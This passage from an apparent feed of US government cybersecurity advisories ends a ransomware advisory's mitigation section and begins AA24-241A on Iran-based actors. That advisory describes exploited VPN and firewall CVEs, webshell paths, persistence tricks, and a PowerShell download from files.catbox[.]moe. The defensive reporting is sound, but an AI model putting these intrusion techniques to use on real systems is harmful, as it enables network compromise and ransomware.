<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus</strong> <strong>software on all hosts.</strong></li>
<li><strong>Implement Secure Logging Collection and Storage Practices&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T\" title=\"Log Collection (2.T)\">CPG 2.T</a>].<strong>&nbsp;</strong>Learn more about logging best practices by referencing <a href=\"https://www.cisa.gov/resources-tools/services/logging-made-easy\" title=\"Logging Made Easy\">CISA’s Logging Made Easy</a> resources.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Implement and enforce email security policies</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable macros by default</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">CPG 2.N</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable hyperlinks in received emails.</strong></li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data, and regularly maintain backup and restoration</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted,</strong> immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul>
<h3>Software Manufacturers</h3>
<p>The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of many of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team):</p>
<ul>
<li><strong>Embed security into product architecture</strong> throughout the entire software development lifecycle (SDLC).</li>
<li><strong>Mandate MFA, ideally phishing-resistant MFA, for privileged users</strong> and make MFA a default, rather than opt-in, feature.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see<strong>&nbsp;Table 6–Table 17</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA, FBI, MS-ISAC, and HHS recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li>#<a href=\"https://www.stopransomware.gov/\">StopRansomware</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to reduce the risk of a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\">#StopRansomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\">Ransomware Readiness Assessment</a>.</li>
<li>Health and Human Services <a href=\"https://hhscyber.hhs.gov/\">HPH Cybersecurity Gateway</a> hosts the HPH CPGs and links to HHS cybersecurity resources.</li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight\" title=\"Ransomware Roundup - Knight\">Ransomware Roundup - Knight | FortiGuard Labs (fortinet.com)</a></li>
<li><a href=\"https://redskyalliance.org/xindustry/knight-ransomware\" title=\"Knight Ransomware\">Knight Ransomware - X-Industry - Red Sky Alliance</a></li>
<li><a href=\"https://www.uptycs.com/blog/threat-research-report-team/cyclops-ransomware-stealer-combo\" title=\"Exploring a Dual Threat: Cyclops Ransomware &amp; Stealer Combo\">Cyclops Ransomware and Stealer Combo: Exploring a Dual Threat (uptycs.com)</a></li>
<li><a href=\"https://www.bleepingcomputer.com/news/security/knight-ransomware-distributed-in-fake-tripadvisor-complaint-emails/\" title=\"Knight ransomware distributed in fake Tripadvisor complaint emails\">Knight ransomware distributed in fake Tripadvisor complaint emails (bleepingcomputer.com)</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The authoring organizations do not encourage paying a ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Thu, 29 Aug 2024 09:17:11 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22102"))) ("Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations" "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Defense Cyber Crime Center (DC3) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that, as of August 2024, a group of Iran-based cyber actors continues to exploit U.S. and foreign organizations. This includes organizations across several sectors in the U.S. (including in the education, finance, healthcare, and defense sectors as well as local government entities) and other countries (including in Israel, Azerbaijan, and the United Arab Emirates). The FBI assesses a significant percentage of these threat actors’ operations against US organizations are intended to obtain and develop network access to then collaborate with ransomware affiliate actors to deploy ransomware. The FBI further assesses these Iran-based cyber actors are associated with the Government of Iran (GOI) and—separate from the ransomware activity—conduct computer network exploitation activity in support of the GOI (such as intrusions enabling the theft of sensitive technical data against organizations in Israel and Azerbaijan).</p>
<p>This CSA provides the threat actor’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs), as well as highlights similar activity from a previous advisory (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-259a\" title=\"Iran-Based Threat Actor Exploits VPN Vulnerabilities\">Iran-Based Threat Actor Exploits VPN Vulnerabilities</a>) that the FBI and CISA published on Sept. 15, 2020. The information and guidance in this advisory are derived from FBI investigative activity and technical analysis of this group’s intrusion activity against U.S. organizations and engagements with numerous entities impacted by this malicious activity.</p>
<p>The FBI recommends all organizations follow guidance provided in the <strong>Mitigations</strong> section of this advisory to defend against the Iranian cyber actors’ activity.</p>
<p>If organizations believe they have been targeted or compromised by the Iranian cyber actors, the FBI and CISA recommend immediately contacting your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI field office</a> for assistance and/or reporting the incident via CISA’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> (see the <strong>Reporting&nbsp;</strong>section of this advisory for more details and contact methods).</p>
<p>For more information on Iran state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/iran\" title=\"Iran Cyber Threat Overview and Advisories\">Iran Cyber Threat</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-241a-iran-based-cyber-actors-enabling-ransomware-attacks-on-us-organizations_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-241A Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations</a>
    <span class=\"c-file__size\">(PDF,       582.01 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX XML</a>
    <span class=\"c-file__size\">(XML,       29.02 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A-Iran-based-Cyber-Actors-Enabling-Ransomware-Attacks-on-US-Organizations.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       29.19 KB
  )</span>
  </div>
</div>
<h2><strong>Threat Actor Details</strong></h2>
<h3>Background on Threat Group and Prior Activity</h3>
<p>This advisory outlines activity by a specific group of Iranian cyber actors that has conducted a high volume of computer network intrusion attempts against U.S. organizations since 2017 and as recently as August 2024. Compromised organizations include U.S.-based schools, municipal governments, financial institutions, and healthcare facilities. This group is known in the private sector by the names Pioneer Kitten, Fox Kitten, UNC757, Parisite, RUBIDIUM, and Lemon Sandstorm.[<a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">1</a>][<a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">2</a>] The actors also refer to themselves by the moniker Br0k3r, and as of 2024, they have been operating under the moniker “xplfinder” in their channels. FBI analysis and investigation indicate the group’s activity is consistent with a cyber actor with Iranian state-sponsorship.</p>
<p>The FBI previously observed these actors attempt to monetize their access to victim organizations on cyber marketplaces. A significant percentage of the group’s US-focused cyber activity is in furtherance of obtaining and maintaining technical access to victim networks to enable future ransomware attacks. The actors offer full domain control privileges, as well as domain admin credentials, to numerous networks worldwide. More recently, the FBI identified these actors collaborating directly with ransomware affiliates to enable encryption operations in exchange for a percentage of the ransom payments. These actors have collaborated with the ransomware affiliates NoEscape[<a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">3</a>], Ransomhouse[<a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">4</a>], and ALPHV (aka BlackCat) (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a\" title=\"#StopRansomware: ALPHV Blackcat\">#StopRansomware: ALPHV Blackcat</a>). The Iranian cyber actors’ involvement in these ransomware attacks goes beyond providing access; they work closely with ransomware affiliates to lock victim networks and strategize on approaches to extort victims. The FBI assesses these actors do not disclose their Iran-based location to their ransomware affiliate contacts and are intentionally vague as to their nationality and origin.</p>
<p>Furthermore, the FBI has historically observed this actor conduct hack-and-leak campaigns, such as the late 2020 campaign known as Pay2Key.[<a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">5</a>],[<a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">6</a>] The actors operated a <code>.onion</code> site (reachable through the Tor browser) hosted on cloud infrastructure registered to an organization previously compromised by the actors. (The actors created the server leveraging their prior access to this victim.)&nbsp;Following the compromise and the subsequent unauthorized acquisition of victim data, the actors publicized news of their compromise (including on social media), tagging accounts of victim and media organizations, and leaking victim data on their <code>.onion</code> site. While this technique has traditionally been used to influence victims to pay ransoms, the FBI does not believe the objective of Pay2Key was to obtain ransom payments. Rather, the FBI assesses Pay2Key was an information operation aimed at undermining the security of Israel-based cyber infrastructure.</p>
<h3>Attribution Details</h3>
<p>FBI investigation identified that the Iranian cyber actors conduct malicious cyber activity, which FBI assessed to be in support of the GOI. The FBI judges this activity to be separate from the previously referenced ransomware-enabling activity. This group directs their activity towards countries and organizations consistent with Iranian state interests, and typically not of interest to the group’s ransomware affiliate contacts, such as U.S. defense sector networks, and those in Israel, Azerbaijan, United Arab Emirates. Instead, it is intended to steal sensitive information from these networks, suggesting the group maintains an association with the GOI. However, the group’s ransomware activities are likely not sanctioned by the GOI, as the actors have expressed concern for government monitoring of cryptocurrency movement associated with their malicious activity.</p>
<p>The group uses the Iranian company name Danesh Novin Sahand (identification number 14007585836), likely as a cover IT entity for the group’s malicious cyber activities.</p>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> Matrix for Enterprise</a> framework, version 15.1. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h3>Overview of Observed Tactics, Techniques, and Procedures</h3>
<p>The Iranian cyber actors’ initial intrusions rely upon exploits of remote external services on internet-facing assets to gain initial access to victim networks. As of July 2024, these actors have been observed scanning IP addresses hosting Check Point Security Gateways, probing for devices potentially vulnerable to CVE-2024-24919. As of April 2024, these actors have conducted mass scanning of IP addresses hosting Palo Alto Networks PAN-OS and GlobalProtect VPN devices. The actors were likely conducting reconnaissance and probing for devices vulnerable to CVE-2024-3400. Historically, this group has exploited organizations by leveraging CVE-2019-19781 and CVE-2023-3519 related to Citrix Netscaler, and CVE-2022-1388 related to BIG-IP F5 devices.</p>
<h3>Reconnaissance, Initial Access, Persistence, and Credential Access</h3>
<p>The actors have been observed using the Shodan search engine to identify and enumerate IP addresses that host devices vulnerable to a particular CVE. The actors’ initial access is usually obtained via exploiting a public-facing networking device, such as Citrix Netscaler (CVE-2019-19781 and CVE-2023-3519), F5 BIG-IP (CVE-2022-1388), Pulse Secure/Ivanti VPNs (CVE-2024-21887), and, more recently, PanOS firewalls (CVE-2024-3400) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<p>Following exploitation of vulnerable devices, the actors use the following techniques:</p>
<ul>
<li>Capture login credentials using webshells on compromised Netscaler devices and append to file named <code>netscaler.1</code> in the same directory as the webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>].</li>
<li>Create the directory <code>/var/vpn/themes/imgs/</code> on Citrix Netscaler devices to deploy a webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. Malicious files deployed to this directory include:
<ul>
<li><code>netscaler.1</code></li>
<li><code>netscaler.php</code></li>
<li><code>ctxHeaderLogon.php</code></li>
</ul>
</li>
<li>Specifically related to Netscaler, place additional webshells on compromised devices immediately after system owners patch the exploited vulnerability [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. The following file locations and filenames have been observed on devices:
<ul>
<li><code>/netscaler/logon/LogonPoint/uiareas/ui_style.php</code></li>
<li><code>/netscaler/logon/sanpdebug.php&nbsp;</code></li>
</ul>
</li>
<li>Create the directory <code>/xui/common/images/</code> on targeted IP addresses [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\">T1133</a>].</li>
<li>Create accounts on victim networks; observed names include “sqladmin$,” “adfsservice,” “IIS_Admin,” “iis-admin,” and “John McCain” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136.001</a>].</li>
<li>Request exemptions to the zero-trust application and security policies for tools they intend to deploy on a victim network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>].</li>
<li>Create malicious scheduled task SpaceAgentTaskMgrSHR in <code>Windows/Spaceport/</code> task folder. This task uses a DLL side-loading technique against the signed Microsoft SysInternals executable <code>contig.exe</code>, which may be renamed to <code>dllhost.ext</code>, to load a payload from version.dll. This file has been observed being executed from the Windows Downloads directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].&nbsp;</li>
<li>Place a malicious backdoor version.dll in <code>C:\\Windows\\ADFS\\</code> directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>].</li>
<li>Use a scheduled task to load malware through installed backdoors [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].</li>
<li>Deployment of Meshcentral to connect with compromised servers for remote access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>For persistence and as detection and mitigation occurs, the actors create a daily Windows service task with random eight characters and attempt execution of a similarly named DLL contained in the <code>C:\\Windows\\system32\\drivers</code>\\ directory. For example, a service named “test” was observed attempting to load a file located at <code>C:\\WINDOWS\\system32\\drivers\\test.sys</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a>].</li>
</ul>
<h3>Execution, Privilege Escalation, and Defense Evasion</h3>
<ul>
<li>Repurpose compromised credentials from exploiting networking devices, such as Citrix Netscaler, to log into other applications (i.e., Citrix XenDesktop) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a>].</li>
<li>Repurpose administrative credentials of network administrators to log into domain controllers and other infrastructure on victim networks [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>].</li>
<li>Use administrator credentials to disable antivirus and security software, and lower PowerShell policies to a less secure level [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a>].</li>
<li>Attempt to enter security exemption tickets to the network security device or contractor to get the actor’s tools allowlisted <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</li>
<li>Use a compromised administrator account to initiate a remote desktop session to another server on the network. In one instance, the FBI observed this technique being used to attempt to start Microsoft Windows PowerShell Integrated Scripted Environment (ISE) to run the command “Invoke-WebRequest” with a URI including <code>files.catbox[.]moe</code>. Catbox is a free, online file hosting site the actors use as a repository/hosting mechanism [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
</ul>
<h3>Discovery</h3>
<ul>
<li>Export system registry hives and network firewall configurations on compromised servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a>].</li>
<li>Exfiltrate account usernames from the victim domain controller, as well as access configuration files and logs—presumably to gather network and user account information for use in further exploitation efforts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>].</li>
</ul>
<h3>Command and Control</h3>
<ul>
<li>Install “AnyDesk” remote access program as a backup access method [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>Enable servers to use Windows PowerShell Web Access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
<li>Use the open source tunneling tool Ligolo (ligolo/ligolo-ng) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
<li>Use NGROK (ngrok[.]io) deployment to create outbound connections to a random subdomain [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
</ul>
<h3>Exfiltration and Impact</h3>
<p>After infiltrating victim networks, the actors collaborate with ransomware affiliates (including NoEscape, Ransomhouse, and ALPHV [aka BlackCat]) in exchange for a percentage of the ransom payments by providing affiliates with access to victim networks, locking victim networks, and strategizing to extort victims <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1657/\" title=\"Financial Theft\">T1657</a>]. The actors also conduct what is assessed to be separate set of malicious activity—stealing sensitive data from victims [<a href=\"https://attack.mitre.org/versions/v15/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>], likely in support of the GOI.</p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 1</strong> to <strong>Table 9</strong> for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>Iranian cyber actors use Shodan (<code>Shodan[.]io</code>) to identify internet infrastructure hosting devices vulnerable to particular CVEs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>
<p>Iranian cyber actors scan and exploit public-facing networking devices, including the following devices and associated CVEs:</p>
<ul>
<li>Citrix Netscaler (CVEs-2019-19781 and CVE-2023-3519)</li>
<li>F5 BIG-IP (CVE-2022-1388)</li>
<li>Pulse Secure/Ivanti VPNs (CVE-2024-21887)</li>
<li>PanOS firewalls (CVE-2024-3400)</li>
<li>Check Point Security Gateways (CVE-2024-24919)</li>
</ul>
</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Iranian cyber actors create <code>/xui/common/images/</code> directory on targeted IP addresses.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3. Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via deployed webshell; create a directory on Netscaler devices for webshell deployment; deploy webshells on compromised Netscaler devices in two directories (observed closely after system owning patching); and place the malicious backdoor <code>version.dll</code>.</td>
</tr>
<tr>
<td>Create Account (Local Account)</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account (Local Account)\">T1136.001</a></td>
<td>Iranian cyber actors create local accounts on victim networks.</td>
</tr>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>Iranian cyber actors request exemptions to zero-trust application for tools they intend to deploy.</td>
</tr>
<tr>
<td>Scheduled Task/Job</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a></td>
<td>Iranian cyber actors implement a scheduled task that uses a DLL side-loading technique and a scheduled task that loads malware through back doors.</td>
</tr>
<tr>
<td>Server Software Component</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a></td>
<td>Iranian cyber actors implement the daily creation of a Windows service task for persistence as detection and mitigation occur.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Local Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a></td>
<td>Iranian cyber actors repurpose compromised credentials (e.g., from a Netscaler device) to log into other applications.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>Iranian cyber actors repurpose administrative credentials of network admins to log into domain controllers and other infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Iranian cyber actors use administrator credentials to disable antivirus and security software.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
